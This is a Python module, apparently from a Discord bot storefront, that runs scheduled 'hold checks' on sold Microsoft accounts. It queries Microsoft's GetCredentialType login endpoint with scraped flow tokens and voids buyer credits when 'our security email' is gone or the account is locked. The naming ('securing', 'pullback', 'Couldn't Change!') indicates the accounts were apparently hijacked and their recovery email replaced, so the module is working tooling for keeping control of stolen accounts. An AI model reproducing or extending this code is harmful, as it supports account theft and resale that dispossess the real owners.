"""Periodic hold checks for autobuy credits.

Two independent schedules:
  • Security-email (pullback) — hourly via GetCredentialType proofs only
    (no password login, no OTP send).
  • Lock / suspended — every hold_check_interval_hours (default 6h).
"""

from __future__ import annotations

import json
import logging
from datetime import datetime, timedelta, timezone
from typing import Any

from database.database import DBConnection
from securing.auth.account_status import get_account_lock_reason

logger = logging.getLogger("bot")


def _utc_now() -> datetime:
    return datetime.now(timezone.utc)


def _parse_ts(value: Any) -> datetime | None:
    if value is None:
        return None
    if isinstance(value, datetime):
        return value if value.tzinfo else value.replace(tzinfo=timezone.utc)
    text = str(value).strip()
    if not text:
        return None
    for fmt in ("%Y-%m-%d %H:%M:%S", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S.%f"):
        try:
            return datetime.strptime(text[:26], fmt).replace(tzinfo=timezone.utc)
        except ValueError:
            continue
    try:
        parsed = datetime.fromisoformat(text.replace("Z", "+00:00"))
        return parsed if parsed.tzinfo else parsed.replace(tzinfo=timezone.utc)
    except ValueError:
        return None


def _fmt_ts(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


def _load_domain() -> str:
    try:
        with open("config/config.json", "r") as f:
            return str(json.load(f).get("domain") or "ilovevbucks.site").lower()
    except Exception:
        return "ilovevbucks.site"


def _proof_matches_expected(proof: dict, expected: str) -> bool:
    """Match full or masked MS proof display to our stored security email."""
    expected = (expected or "").strip().lower().replace(r"\u0040", "@")
    if not expected or "@" not in expected:
        return False
    local, _, domain = expected.partition("@")
    display = (
        str(proof.get("display") or proof.get("displayProofName") or "")
        .lower()
        .replace(r"\u0040", "@")
    )
    clear = str(proof.get("clearDigits") or "").lower()

    if display == expected:
        return True
    if "@" not in display:
        return bool(clear) and local.startswith(clear) and domain in display

    d_local, _, d_domain = display.partition("@")
    if d_domain != domain:
        return False
    if "*" in d_local:
        prefix = d_local.split("*", 1)[0]
        if prefix and local.startswith(prefix):
            return True
        if clear and local.startswith(clear):
            return True
        return False
    return d_local == local


def _any_domain_proof(proofs: list, domain: str) -> bool:
    domain = domain.lower()
    for proof in proofs:
        if not isinstance(proof, dict):
            continue
        display = (
            str(proof.get("display") or "")
            .lower()
            .replace(r"\u0040", "@")
        )
        if display.endswith("@" + domain):
            return True
    return False


async def fetch_credential_type(email: str) -> dict | None:
    """Read-only GetCredentialType — never sends an OTP.

    Needs a fresh PPFT/flowToken from login.live.com (empty token often omits Credentials).
    """
    try:
        from securing.auth.initial_session import get_session
        from securing.utils.cookies.get_livedata import livedata
        from securing.utils.proxy import close_session
    except Exception:
        get_session = livedata = close_session = None  # type: ignore

    session = None
    try:
        if get_session is None or livedata is None:
            raise RuntimeError("session helpers unavailable")
        session = get_session()
        live = await livedata(session)
        flow = live.get("ppft") or live.get("sFT") or ""
        resp = await session.post(
            url="https://login.live.com/GetCredentialType.srf",
            headers={
                "Accept": "application/json",
                "Content-Type": "application/json; charset=utf-8",
                "Referer": "https://login.live.com/",
            },
            json={
                "checkPhones": True,
                "country": "",
                "federationFlags": 3,
                "flowToken": flow,
                "forceotclogin": False,
                "isCookieBannerShown": True,
                "isExternalFederationDisallowed": True,
                "isFederationDisabled": True,
                "isFidoSupported": False,
                "isOtherIdpSupported": False,
                "isReactLoginRequest": True,
                "isRemoteConnectSupported": False,
                "isRemoteNGCSupported": True,
                "isSignup": False,
                "otclogindisallowed": False,
                "username": email,
            },
        )
        body = resp.text or ""
        if not body.strip():
            logger.warning(
                "GetCredentialType empty for %s status=%s", email, resp.status_code
            )
            return None
        try:
            return resp.json()
        except Exception:
            logger.warning(
                "GetCredentialType non-JSON for %s status=%s snippet=%r",
                email,
                resp.status_code,
                body[:200],
            )
            return None
    except Exception as exc:
        logger.warning(
            "GetCredentialType failed for %s: %s",
            email,
            exc.__class__.__name__,
        )
        return None
    finally:
        if session is not None and close_session is not None:
            try:
                await close_session(session)
            except Exception:
                pass


async def check_security_email_intact(
    email: str,
    expected_security_email: str | None,
    *,
    domain: str | None = None,
) -> tuple[str, str | None]:
    """Return (ok|bad|unknown, reason).

    Confirms the sold account still lists our security email on GetCredentialType
    (masked proofs supported). No password login / no OTP.
    """
    email = (email or "").strip()
    if not email:
        return "unknown", "Missing email for security-email check"

    domain = (domain or _load_domain()).lower()
    expected = (expected_security_email or "").strip()
    if expected in ("Couldn't Change!", "Unknown", "N/A"):
        expected = ""

    info = await fetch_credential_type(email)
    if not info:
        return "unknown", "GetCredentialType inconclusive"

    # 0 = Exists, 1 = Not exist (common MS values)
    if_exists = info.get("IfExistsResult")
    if if_exists in (1, "1"):
        return "bad", "Account email no longer exists at Microsoft"

    creds = info.get("Credentials")
    if not isinstance(creds, dict):
        return "unknown", "GetCredentialType missing Credentials"

    proofs = creds.get("OtcLoginEligibleProofs") or []
    if not isinstance(proofs, list):
        proofs = []

    if expected:
        for proof in proofs:
            if isinstance(proof, dict) and _proof_matches_expected(proof, expected):
                return "ok", None
        # Expected proof gone — pullback / security email removed
        if proofs:
            shown = [
                str(p.get("display") or "?")
                for p in proofs
                if isinstance(p, dict)
            ][:5]
            return (
                "bad",
                f"Security email removed or replaced (expected {expected}; saw {shown})",
            )
        return "bad", f"Security email proof missing (expected {expected})"

    # No stored expected — at least require our domain still present
    if _any_domain_proof(proofs, domain):
        return "ok", None
    if proofs:
        return "bad", f"No @{domain} security email on account anymore"
    return "bad", f"No email OTP proofs left (expected @{domain})"


async def check_sold_account(email: str, password: str | None = None) -> tuple[str, str | None]:
    """Lock-only check. ``password`` kept for call-site compat."""
    del password
    if not (email or "").strip():
        return "unknown", "Missing email for lock check"

    try:
        lock_reason = await get_account_lock_reason(email.strip())
    except Exception as exc:
        logger.warning(
            "autobuy lock check inconclusive for %s: %s",
            email,
            exc.__class__.__name__,
        )
        return "unknown", f"Lock check inconclusive ({exc.__class__.__name__})"

    if lock_reason:
        return "bad", lock_reason
    return "ok", None


def _next_after(
    now: datetime,
    hours: float,
    available_at: datetime | None,
) -> datetime:
    nxt = now + timedelta(hours=max(0.25, float(hours)))
    if available_at and nxt > available_at:
        return available_at
    return nxt


async def process_due_hold_checks(
    *,
    security_interval_hours: float = 1.0,
    lock_interval_hours: float = 6.0,
    limit: int = 20,
) -> dict:
    """Run due security-email and/or lock checks. Returns {stats, void_events}."""
    stats = {
        "checked": 0,
        "sec_checked": 0,
        "lock_checked": 0,
        "cleared": 0,
        "voided": 0,
        "rescheduled": 0,
        "skipped": 0,
    }
    void_events: list[dict] = []
    with DBConnection() as db:
        due = db.autobuy_credits_due_for_check(limit=limit)

    if not due:
        return {"stats": stats, "void_events": void_events}

    sec_hours = max(0.25, float(security_interval_hours))
    lock_hours = max(1.0, float(lock_interval_hours))
    now = _utc_now()
    domain = _load_domain()

    for row in due:
        credit_id = int(row["id"])
        email = (row.get("ms_email") or row.get("email") or "").strip()
        expected_sec = (row.get("ms_security_email") or "").strip()
        discord_id = int(row["discord_id"])
        remaining = float(row.get("remaining_usd") or 0)
        available_at = _parse_ts(row.get("available_at"))
        next_sec_due = _parse_ts(row.get("next_check_at"))
        next_lock_due = _parse_ts(row.get("next_lock_check_at"))

        run_sec = next_sec_due is None or next_sec_due <= now
        run_lock = next_lock_due is None or next_lock_due <= now
        # Fresh rows may only have next_check_at set — still run lock on first pass
        # if lock column never scheduled.
        if row.get("next_lock_check_at") is None and not run_lock:
            run_lock = True

        if not email:
            logger.warning("autobuy hold check skip credit=%s — missing email", credit_id)
            with DBConnection() as db:
                db.autobuy_mark_credit_checked(
                    credit_id,
                    next_check_at=_fmt_ts(now + timedelta(hours=min(sec_hours, 2.0))),
                    next_lock_check_at=_fmt_ts(now + timedelta(hours=min(lock_hours, 2.0))),
                )
            stats["skipped"] += 1
            continue

        void_reason: str | None = None
        new_sec_at: str | None = None
        new_lock_at: str | None = None

        if run_sec:
            try:
                status, reason = await check_security_email_intact(
                    email,
                    expected_sec,
                    domain=domain,
                )
            except Exception:
                logger.exception(
                    "autobuy security-email check crashed credit=%s email=%s",
                    credit_id,
                    email,
                )
                status, reason = "unknown", "security-email check crashed"

            stats["sec_checked"] += 1
            stats["checked"] += 1
            if status == "bad":
                void_reason = reason or "security email no longer intact"
            elif status == "unknown":
                new_sec_at = _fmt_ts(now + timedelta(hours=1))
            else:
                new_sec_at = _fmt_ts(_next_after(now, sec_hours, available_at))
                logger.info(
                    "autobuy security-email OK credit=%s email=%s expected=%s",
                    credit_id,
                    email,
                    expected_sec or f"@{domain}",
                )

        if void_reason is None and run_lock:
            try:
                status, reason = await check_sold_account(email)
            except Exception:
                logger.exception(
                    "autobuy lock check crashed credit=%s email=%s",
                    credit_id,
                    email,
                )
                status, reason = "unknown", "lock check crashed"

            stats["lock_checked"] += 1
            if not run_sec:
                stats["checked"] += 1
            if status == "bad":
                void_reason = reason or "failed lock check"
            elif status == "unknown":
                new_lock_at = _fmt_ts(now + timedelta(hours=1))
            else:
                new_lock_at = _fmt_ts(_next_after(now, lock_hours, available_at))

        if void_reason:
            with DBConnection() as db:
                voided = db.autobuy_void_credit(credit_id, void_reason)
            if voided > 0:
                stats["voided"] += 1
                void_events.append(
                    {
                        "discord_id": discord_id,
                        "email": email,
                        "amount_usd": voided or remaining,
                        "reason": void_reason,
                    }
                )
                logger.warning(
                    "autobuy voided credit=%s email=%s reason=%s amount=$%.2f",
                    credit_id,
                    email,
                    void_reason,
                    voided,
                )
            continue

        hold_elapsed = available_at is not None and available_at <= now
        if hold_elapsed:
            with DBConnection() as db:
                db.autobuy_mark_credit_checked(
                    credit_id,
                    next_check_at=None,
                    next_lock_check_at=None,
                    clear=True,
                )
            stats["cleared"] += 1
            logger.info("autobuy cleared credit=%s email=%s", credit_id, email)
            continue

        # Preserve schedules for checks that did not run this pass
        if new_sec_at is None:
            if next_sec_due and not run_sec:
                new_sec_at = _fmt_ts(next_sec_due)
            else:
                new_sec_at = _fmt_ts(_next_after(now, sec_hours, available_at))
        if new_lock_at is None:
            if next_lock_due and not run_lock:
                new_lock_at = _fmt_ts(next_lock_due)
            else:
                new_lock_at = _fmt_ts(_next_after(now, lock_hours, available_at))

        with DBConnection() as db:
            db.autobuy_mark_credit_checked(
                credit_id,
                next_check_at=new_sec_at,
                next_lock_check_at=new_lock_at,
            )
        stats["rescheduled"] += 1

    return {"stats": stats, "void_events": void_events}
